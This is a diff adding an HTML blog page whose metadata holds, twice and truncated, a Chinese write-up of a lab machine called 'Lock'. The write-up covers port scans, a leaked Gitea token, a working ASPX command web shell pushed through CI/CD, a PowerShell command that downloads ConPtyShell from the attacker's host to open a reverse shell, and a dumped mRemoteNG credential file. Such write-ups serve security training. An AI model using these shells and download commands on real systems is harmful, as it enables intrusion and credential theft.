@@ -1,0 +1,1248 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/99706997?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 信息收集
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 10.129.234.64
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 12:20 CST
+Nmap scan report for 10.129.234.64 (10.129.234.64)
+Host is up (0.17s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+80/tcp   open  http
+445/tcp  open  microsoft-ds
+3000/tcp open  ppp
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
+
+┌──(root㉿MJ)-[/tmp/test]
+└─# nmap -sV -sC -O -p80,445,3000,3389 10.129.234.64
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 12:20 CST
+Nmap scan report for 10.129.234.64 (10.129.234.64)
+Host is up (0.18s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: Lock - Index
+|_http-server-header: Microsoft-IIS/10.0
+445/tcp  open  microsoft-ds?
+3000/tcp open  http          Golang net/http server
+|_http-title: Gitea: Git with a cup of tea
+| fingerprint-strings:
+|   GenericLines, Help, RTSPRequest:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=a865c00922d0321f; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=1qqwoFwYj7mnLM1dUF-dAWixUxw6MTc2NDkwODQzODU5OTY1NzAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Fri, 05 Dec 2025 04:20:38 GMT
+|     <!DOCTYPE html>
+|     <html lang='en-US' class='theme-auto'>
+|     <head>
+|     <meta name='viewport' content='width=device-width, initial-scale=1'>
+|     <title>Gitea: Git with a cup of tea</title>
+|     <link rel='manifest' href='data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
+|   HTTPOptions:
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=8d992280eb14793f; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=D4r1ealHN8sJRRAbJCv0_SM0E086MTc2NDkwODQzOTQ4MzA5NzAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Fri, 05 Dec 2025 04:20:39 GMT
+|_    Content-Length: 0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: LOCK
+|   NetBIOS_Domain_Name: LOCK
+|   NetBIOS_Computer_Name: LOCK
+|   DNS_Domain_Name: Lock
+|   DNS_Computer_Name: Lock
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-12-05T04:21:10+00:00
+|_ssl-date: 2025-12-05T04:21:49+00:00; -2s from scanner time.
+| ssl-cert: Subject: commonName=Lock
+| Not valid before: 2025-12-04T04:18:57
+|_Not valid after:  2026-06-05T04:18:57
+1 service unrecognized despite returning data.
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2025-12-05T04:21:11
+|_  start_date: N/A
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 79.66 seconds
+```
+
+可以看到开放了Web(80,3000)，smb(445)，rpc(3389)，基本可以确定这是台windows机器
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# curl 10.129.234.64                                                       
+  <!-- =======================================================
+  * Template Name: Gp
+  * Updated: Nov 25 2023 with Bootstrap v5.3.2
+  * Template URL: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/
+  * Author: BootstrapMade.com
+  * License: https://bootstrapmade.com/license/
+  ======================================================== -->
+</head>
+```
+curl一下目标靶机，可以看到bootstrap框架，见过的都了解这是个前端框架，没有什么利用价值
+
+在3000端口下可以找到历史版的脚本`http://10.129.234.64:3000/ellen.freeman/dev-scripts/commit/dcc869b175a47ff2a2b8171cda55cb82dbddff3d`
+
+```python
+import requests
+import sys
+
+# store this in env instead at some point
+PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
+
+def format_domain(domain):
+    if not domain.startswith(('http://', 'https://')):
+        domain = 'https://' + domain
+    return domain
+
+def get_repositories(token, domain):
+    headers = {
+        'Authorization': f'token {token}'
+    }
+    url = f'{domain}/api/v1/user/repos'
+    response = requests.get(url, headers=headers)
+
+    if response.status_code == 200:
+        return response.json()
+    else:
+        raise Exception(f'Failed to retrieve repositories: {response.status_code}')
+
+def main():
+    if len(sys.argv) < 2:
+        print('Usage: python script.py <gitea_domain>')
+        sys.exit(1)
+
+    gitea_domain = format_domain(sys.argv[1])
+
+    try:
+        repos = get_repositories(PERSONAL_ACCESS_TOKEN, gitea_domain)
+        print('Repositories:')
+        for repo in repos:
+            print(f'- {repo['full_name']}')
+    except Exception as e:
+        print(f'Error: {e}')
+
+if __name__ == '__main__':
+    main()
+```
+可以看到**PERSONAL_ACCESS_TOKEN**被硬编码了，在新版脚本中，从环境变量读取凭据，然后列出仓库
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f                                                       
+┌──(root㉿MJ)-[/tmp/test]
+└─# vim ez.py
+
+┌──(root㉿MJ)-[/tmp/test]
+└─# python3 ez.py http://10.129.234.64:3000
+Repositories:
+- ellen.freeman/dev-scripts
+- ellen.freeman/website
+列出了仓库
+```
+一个是3000端口部署的，一个是80部署的
+```bash
+git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/dev-scripts.git
+
+git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
+```
+如果未知用户名可以直接使用`http://<PAT>@ip:port/<REPO_FULL_NAME>.git`
+
+
+```bash
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# cat changelog.txt&& cat readme.md
+# Changelog
+
+- Added first website version
+# New Project Website
+
+CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
+```
+
+# Web
+
+可以看到提示，存储库的改变会被自动推送到网站上，所以可以写个windows的木马推上去
+
+```bash
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# cat shell.aspx
+<%@ Page Language='C#'%>
+<%@ Import Namespace='System.Diagnostics'%>
+<%@ Import Namespace='System.IO'%>
+<script language='C#' runat='server'>
+    void Page_Load(object sender, EventArgs e) {
+        string cmd = Request.QueryString['cmd'];
+        if (!string.IsNullOrEmpty(cmd)) {
+            Process p = new Process();
+            p.StartInfo.FileName = 'cmd.exe';
+            p.StartInfo.Arguments = '/c ' + cmd;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardError = true;
+            p.Start();
+            string output = p.StandardOutput.ReadToEnd();
+            output += p.StandardError.ReadToEnd();
+            p.WaitForExit();
+            Response.Write('<pre>' + output + '</pre>');
+        }
+    }
+</script>
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# git add shell.aspx
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# git commit -m 'Added shell.aspx for temporary debugging'
+[main 9733d61] Added shell.aspx for temporary debugging
+ Committer: root <root@MJ.localdomain>
+Your name and email address were configured automatically based
+on your username and hostname. Please check that they are accurate.
+You can suppress this message by setting them explicitly. Run the
+following command and follow the instructions in your editor to edit
+your configuration file:
+
+    git config --global --edit
+
+After doing this, you may fix the identity used for this commit with:
+
+    git commit --amend --reset-author
+
+ 1 file changed, 21 insertions(+)
+ create mode 100644 shell.aspx
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# git push
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 20 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 663 bytes | 663.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://10.129.234.64:3000/ellen.freeman/website.git
+   73cdcc1..9733d61  main -> main
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# curl http://10.129.234.64/shell.aspx?cmd=whoami
+<pre>lock\ellen.freeman
+</pre>                                                                       
+```
+
+# 提权
+
+交互式shell
+```powershell
+New-Item -Path C:\temp -Type Directory -Force; (New-Object System.Net.WebClient).DownloadFile('http://10.10.16.15:8000/ConPtyShell.exe','C:\temp\ConPtyShell.exe'); C:\temp\ConPtyShell.exe 10.10.16.15 2332
+```
+
+```bash
+curl 'http://10.129.234.64/shell.aspx?cmd=powershell.exe%20-c%20%22New-Item%20-Path%20C%3A%5Ctemp%20-Type%20Directory%20-Force%3B%20(New-Object%20System.Net.WebClient).DownloadFile(%27http%3A%2F%2F10.10.16.15%3A8000%2FConPtyShell.exe%27%2C%27C%3A%5Ctemp%5CConPtyShell.exe%27)%3B%20C%3A%5Ctemp%5CConPtyShell.exe%2010.10.16.15%202332%22'
+```
+
+在document目录下发现config.xml
+```bash
+┌──(root㉿MJ)-[~/…/Linux/vshell/download/2]
+└─# cat config.xml
+<?xml version='1.0' encoding='utf-8'?>
+<mrng:Connections xmlns:mrng='http://mremoteng.org' Name='Connections' Export='false' EncryptionEngine='AES' BlockCipherMode='GCM' KdfIterations='1000' FullFileEncryption='false' Protected='sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp' ConfVersion='2.6'>
+    <Node Name='RDP/Gale' Type='Connection' Descr='' Icon='mRemoteNG' Panel='General' Id='a179606a-a854-48a6-9baa-491d8eb3bddc' Username='Gale.Dekarios' Domain='' Password='TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==' Hostname='Lock' Protocol='RDP' PuttySession='Default Settings' Port='3389' ConnectToConsole='false' UseCredSsp='true' RenderingEngine='IE' ICAEncryptionStrength='EncrBasic' RDPAuthenticationLevel='NoAuth' RDPMinutesToIdleTimeout='0' RDPAlertIdleTimeout='false' LoadBalanceInfo='' Colors='Colors16Bit' Resolution='FitToWindow' AutomaticResize='true' DisplayWallpaper='false' DisplayThemes='false' EnableFontSmoothing='false' EnableDesktopComposition='false' CacheBitmaps='false' RedirectDiskDrives='false' RedirectPorts='false' RedirectPrinters='false' RedirectSmartCards='false' RedirectSound='DoNotPlay' SoundQuality='Dynamic' RedirectKeys='false' Connected='false' PreExtApp='' PostExtApp='' MacAddress='' UserField='' ExtApp='' VNCCompression='CompNone' VNCEncoding='EncHextile' VNCAuthMode='AuthVNC' VNCProxyType='ProxyNone' VNCProxyIP='' VNCProxyPort='0' VNCProxyUsername='' VNCProxyPassword='' VNCColors='ColNormal' VNCSmartSizeMode='SmartSAspect' VNCViewOnly='false' RDGatewayUsageMethod='Never' RDGatewayHostname='' RDGatewayUseConnectionCredentials='Yes' RDGatewayUsername='' RDGatewayPassword='' RDGatewayDomain='' InheritCacheBitmaps='false' InheritColors='false' InheritDescription='false' InheritDisplayThemes='false' InheritDisplayWallpaper='false' InheritEnableFontSmoothing='false' InheritEnableDesktopComposition='false' InheritDomain='false' InheritIcon='false' InheritPanel='false' InheritPassword='false' InheritPort='false' InheritProtocol='false' InheritPuttySession='false' InheritRedirectDiskDrives='false' InheritRedirectKeys='false' InheritRedirectPorts='false' InheritRedirectPrinters='false' InheritRedirectSmartCards='false' InheritRedirectSound='false' InheritSoundQuality='false' InheritResolution='false' InheritAutomaticResize='false' InheritUseConsoleSession='false' InheritUseCredSsp='false' InheritRenderingEngine='false' InheritUsername='false' InheritICAEncryptionStrength='false' InheritRDPAuthenticationLevel='false' InheritRDPMinutesToIdleTimeout='false' InheritRDPAlertIdleTimeout='false' InheritLoadBalanceInfo='false' InheritPreExtApp='false' InheritPostExtApp='false' InheritMacAddress='false' InheritUserField='false' InheritExtApp='false' InheritVNCCompression='false' InheritVNCEncoding='false' InheritVNCAuthMode='false' InheritVNCProxyType='false' InheritVNCProxyIP='false' InheritVNCProxyPort='false' InheritVNCProxyUsername='false' InheritVNCProxyPassword='false' InheritVNCColors='false' InheritVNCSmartSizeMode='false' InheritVNCViewOnly='false' InheritRDGatewayUsageMethod='false' InheritRDGatewayHostname='false' InheritRDGatewayUseConnectionCredentials='false' InheritRDGatewayUsername='false' InheritRDGatewayPassword='false' InheritRDGatewayDomain='false' />
+</mrng:Connections>
+```
+
+这是`mRemoteNG` 远程桌面管理工具**的配置文件**
+## 🔑 敏感信息分析
+
+| **字段**                                                                                                 | **含义**                                  | **价值**    |
+| ------------------------------------------------------------------------------------------------------ | --------------------------------------- | --------- |
+| `xmlns:mrng='http://mremoteng.org'`                                                                    | 确认这是 `mRemoteNG` 软件的配置文件。">
+<meta property="og:title" content="Lock">
+<meta property="og:description" content="# 信息收集
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 10.129.234.64
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 12:20 CST
+Nmap scan report for 10.129.234.64 (10.129.234.64)
+Host is up (0.17s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+80/tcp   open  http
+445/tcp  open  microsoft-ds
+3000/tcp open  ppp
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
+
+┌──(root㉿MJ)-[/tmp/test]
+└─# nmap -sV -sC -O -p80,445,3000,3389 10.129.234.64
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 12:20 CST
+Nmap scan report for 10.129.234.64 (10.129.234.64)
+Host is up (0.18s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: Lock - Index
+|_http-server-header: Microsoft-IIS/10.0
+445/tcp  open  microsoft-ds?
+3000/tcp open  http          Golang net/http server
+|_http-title: Gitea: Git with a cup of tea
+| fingerprint-strings:
+|   GenericLines, Help, RTSPRequest:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=a865c00922d0321f; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=1qqwoFwYj7mnLM1dUF-dAWixUxw6MTc2NDkwODQzODU5OTY1NzAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Fri, 05 Dec 2025 04:20:38 GMT
+|     <!DOCTYPE html>
+|     <html lang='en-US' class='theme-auto'>
+|     <head>
+|     <meta name='viewport' content='width=device-width, initial-scale=1'>
+|     <title>Gitea: Git with a cup of tea</title>
+|     <link rel='manifest' href='data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
+|   HTTPOptions:
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=8d992280eb14793f; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=D4r1ealHN8sJRRAbJCv0_SM0E086MTc2NDkwODQzOTQ4MzA5NzAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Fri, 05 Dec 2025 04:20:39 GMT
+|_    Content-Length: 0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: LOCK
+|   NetBIOS_Domain_Name: LOCK
+|   NetBIOS_Computer_Name: LOCK
+|   DNS_Domain_Name: Lock
+|   DNS_Computer_Name: Lock
+|   Product_Version: 10.0.20348
+|_  System_Time: 2025-12-05T04:21:10+00:00
+|_ssl-date: 2025-12-05T04:21:49+00:00; -2s from scanner time.
+| ssl-cert: Subject: commonName=Lock
+| Not valid before: 2025-12-04T04:18:57
+|_Not valid after:  2026-06-05T04:18:57
+1 service unrecognized despite returning data.
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2025-12-05T04:21:11
+|_  start_date: N/A
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 79.66 seconds
+```
+
+可以看到开放了Web(80,3000)，smb(445)，rpc(3389)，基本可以确定这是台windows机器
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# curl 10.129.234.64                                                       
+  <!-- =======================================================
+  * Template Name: Gp
+  * Updated: Nov 25 2023 with Bootstrap v5.3.2
+  * Template URL: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/
+  * Author: BootstrapMade.com
+  * License: https://bootstrapmade.com/license/
+  ======================================================== -->
+</head>
+```
+curl一下目标靶机，可以看到bootstrap框架，见过的都了解这是个前端框架，没有什么利用价值
+
+在3000端口下可以找到历史版的脚本`http://10.129.234.64:3000/ellen.freeman/dev-scripts/commit/dcc869b175a47ff2a2b8171cda55cb82dbddff3d`
+
+```python
+import requests
+import sys
+
+# store this in env instead at some point
+PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
+
+def format_domain(domain):
+    if not domain.startswith(('http://', 'https://')):
+        domain = 'https://' + domain
+    return domain
+
+def get_repositories(token, domain):
+    headers = {
+        'Authorization': f'token {token}'
+    }
+    url = f'{domain}/api/v1/user/repos'
+    response = requests.get(url, headers=headers)
+
+    if response.status_code == 200:
+        return response.json()
+    else:
+        raise Exception(f'Failed to retrieve repositories: {response.status_code}')
+
+def main():
+    if len(sys.argv) < 2:
+        print('Usage: python script.py <gitea_domain>')
+        sys.exit(1)
+
+    gitea_domain = format_domain(sys.argv[1])
+
+    try:
+        repos = get_repositories(PERSONAL_ACCESS_TOKEN, gitea_domain)
+        print('Repositories:')
+        for repo in repos:
+            print(f'- {repo['full_name']}')
+    except Exception as e:
+        print(f'Error: {e}')
+
+if __name__ == '__main__':
+    main()
+```
+可以看到**PERSONAL_ACCESS_TOKEN**被硬编码了，在新版脚本中，从环境变量读取凭据，然后列出仓库
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f                                                       
+┌──(root㉿MJ)-[/tmp/test]
+└─# vim ez.py
+
+┌──(root㉿MJ)-[/tmp/test]
+└─# python3 ez.py http://10.129.234.64:3000
+Repositories:
+- ellen.freeman/dev-scripts
+- ellen.freeman/website
+列出了仓库
+```
+一个是3000端口部署的，一个是80部署的
+```bash
+git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/dev-scripts.git
+
+git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
+```
+如果未知用户名可以直接使用`http://<PAT>@ip:port/<REPO_FULL_NAME>.git`
+
+
+```bash
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# cat changelog.txt&& cat readme.md
+# Changelog
+
+- Added first website version
+# New Project Website
+
+CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
+```
+
+# Web
+
+可以看到提示，存储库的改变会被自动推送到网站上，所以可以写个windows的木马推上去
+
+```bash
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# cat shell.aspx
+<%@ Page Language='C#'%>
+<%@ Import Namespace='System.Diagnostics'%>
+<%@ Import Namespace='System.IO'%>
+<script language='C#' runat='server'>
+    void Page_Load(object sender, EventArgs e) {
+        string cmd = Request.QueryString['cmd'];
+        if (!string.IsNullOrEmpty(cmd)) {
+            Process p = new Process();
+            p.StartInfo.FileName = 'cmd.exe';
+            p.StartInfo.Arguments = '/c ' + cmd;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardError = true;
+            p.Start();
+            string output = p.StandardOutput.ReadToEnd();
+            output += p.StandardError.ReadToEnd();
+            p.WaitForExit();
+            Response.Write('<pre>' + output + '</pre>');
+        }
+    }
+</script>
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# git add shell.aspx
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# git commit -m 'Added shell.aspx for temporary debugging'
+[main 9733d61] Added shell.aspx for temporary debugging
+ Committer: root <root@MJ.localdomain>
+Your name and email address were configured automatically based
+on your username and hostname. Please check that they are accurate.
+You can suppress this message by setting them explicitly. Run the
+following command and follow the instructions in your editor to edit
+your configuration file:
+
+    git config --global --edit
+
+After doing this, you may fix the identity used for this commit with:
+
+    git commit --amend --reset-author
+
+ 1 file changed, 21 insertions(+)
+ create mode 100644 shell.aspx
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# git push
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 20 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 663 bytes | 663.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://10.129.234.64:3000/ellen.freeman/website.git
+   73cdcc1..9733d61  main -> main
+
+┌──(root㉿MJ)-[/tmp/test/website]
+└─# curl http://10.129.234.64/shell.aspx?cmd=whoami
+<pre>lock\ellen.freeman
+</pre>                                                                       
+```
+
+# 提权
+
+交互式shell
+```powershell
+New-Item -Path C:\temp -Type Directory -Force; (New-Object System.Net.WebClient).DownloadFile('http://10.10.16.15:8000/ConPtyShell.exe','C:\temp\ConPtyShell.exe'); C:\temp\ConPtyShell.exe 10.10.16.15 2332
+```
+
+```bash
+curl 'http://10.129.234.64/shell.aspx?cmd=powershell.exe%20-c%20%22New-Item%20-Path%20C%3A%5Ctemp%20-Type%20Directory%20-Force%3B%20(New-Object%20System.Net.WebClient).DownloadFile(%27http%3A%2F%2F10.10.16.15%3A8000%2FConPtyShell.exe%27%2C%27C%3A%5Ctemp%5CConPtyShell.exe%27)%3B%20C%3A%5Ctemp%5CConPtyShell.exe%2010.10.16.15%202332%22'
+```
+
+在document目录下发现config.xml
+```bash
+┌──(root㉿MJ)-[~/…/Linux/vshell/download/2]
+└─# cat config.xml
+<?xml version='1.0' encoding='utf-8'?>
+<mrng:Connections xmlns:mrng='http://mremoteng.org' Name='Connections' Export='false' EncryptionEngine='AES' BlockCipherMode='GCM' KdfIterations='1000' FullFileEncryption='false' Protected='sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp' ConfVersion='2.6'>
+    <Node Name='RDP/Gale' Type='Connection' Descr='' Icon='mRemoteNG' Panel='General' Id='a179606a-a854-48a6-9baa-491d8eb3bddc' Username='Gale.Dekarios' Domain='' Password='TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==' Hostname='Lock' Protocol='RDP' PuttySession='Default Settings' Port='3389' ConnectToConsole='false' UseCredSsp='true' RenderingEngine='IE' ICAEncryptionStrength='EncrBasic' RDPAuthenticationLevel='NoAuth' RDPMinutesToIdleTimeout='0' RDPAlertIdleTimeout='false' LoadBalanceInfo='' Colors='Colors16Bit' Resolution='FitToWindow' AutomaticResize='true' DisplayWallpaper='false' DisplayThemes='false' EnableFontSmoothing='false' EnableDesktopComposition='false' CacheBitmaps='false' RedirectDiskDrives='false' RedirectPorts='false' RedirectPrinters='false' RedirectSmartCards='false' RedirectSound='DoNotPlay' SoundQuality='Dynamic' RedirectKeys='false' Connected='false' PreExtApp='' PostExtApp='' MacAddress='' UserField='' ExtApp='' VNCCompression='CompNone' VNCEncoding='EncHextile' VNCAuthMode='AuthVNC' VNCProxyType='ProxyNone' VNCProxyIP='' VNCProxyPort='0' VNCProxyUsername='' VNCProxyPassword='' VNCColors='ColNormal' VNCSmartSizeMode='SmartSAspect' VNCViewOnly='false' RDGatewayUsageMethod='Never' RDGatewayHostname='' RDGatewayUseConnectionCredentials='Yes' RDGatewayUsername='' RDGatewayPassword='' RDGatewayDomain='' InheritCacheBitmaps='false' InheritColors='false' InheritDescription='false' InheritDisplayThemes='false' InheritDisplayWallpaper='false' InheritEnableFontSmoothing='false' InheritEnableDesktopComposition='false' InheritDomain='false' InheritIcon='false' InheritPanel='false' InheritPassword='false' InheritPort='false' InheritProtocol='false' InheritPuttySession='false' InheritRedirectDiskDrives='false' InheritRedirectKeys='false' InheritRedirectPorts='false' InheritRedirectPrinters='false' InheritRedirectSmartCards='false' InheritRedirectSound='false' InheritSoundQuality='false' InheritResolution='false' InheritAutomaticResize='false' InheritUseConsoleSession='false' InheritUseCredSsp='false' InheritRenderingEngine='false' InheritUsername='false' InheritICAEncryptionStrength='false' InheritRDPAuthenticationLevel='false' InheritRDPMinutesToIdleTimeout='false' InheritRDPAlertIdleTimeout='false' InheritLoadBalanceInfo='false' InheritPreExtApp='false' InheritPostExtApp='false' InheritMacAddress='false' InheritUserField='false' InheritExtApp='false' InheritVNCCompression='false' InheritVNCEncoding='false' InheritVNCAuthMode='false' InheritVNCProxyType='false' InheritVNCProxyIP='false' InheritVNCProxyPort='false' InheritVNCProxyUsername='false' InheritVNCProxyPassword='false' InheritVNCColors='false' InheritVNCSmartSizeMode='false' InheritVNCViewOnly='false' InheritRDGatewayUsageMethod='false' InheritRDGatewayHostname='false' InheritRDGatewayUseConnectionCredentials='false' InheritRDGatewayUsername='false' InheritRDGatewayPassword='false' InheritRDGatewayDomain='false' />
+</mrng:Connections>
+```
+
+这是`mRemoteNG` 远程桌面管理工具**的配置文件**
+## 🔑 敏感信息分析
+
+| **字段**                                                                                                 | **含义**                                  | **价值**    |
+| ------------------------------------------------------------------------------------------------------ | --------------------------------------- | --------- |
+| `xmlns:mrng='http://mremoteng.org'`                                                                    | 确认这是 `mRemoteNG` 软件的配置文件。">
+<meta property="og:type" content="article">
